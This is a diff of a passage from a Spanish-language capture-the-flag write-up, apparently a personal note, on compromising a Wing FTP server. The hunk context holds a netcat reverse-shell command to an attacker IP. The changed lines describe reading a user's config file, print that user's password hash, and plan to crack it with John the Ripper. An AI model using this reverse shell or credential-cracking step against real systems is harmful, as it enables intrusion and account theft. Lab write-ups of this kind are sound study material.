@@ -37,10 +37,13 @@ busybox nc 10.10.15.216 443 -e sh
 
 
 Obtenemos una shell como como el usuario `wingftp`
-En la rutA `/opt/wftpserver/Data/1` encontramos un archivo llamdo `settings.xml` en el cual encontramso el usuario y la contraseña de la base de datos
-```ad-hint
-root::
+En la rutA `/opt/wftpserver/Data/1/users` encontramos archivos de configuracion de diferentes usuarios, en este caso leeremos el de `wacky` en el cual entromas un hash el cual podremos romper
 ```
+32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
+```
+
+Se lo pasaremos a [[JOHN THE RIPPER]]
+
 
 
 shadow 256 hashcat
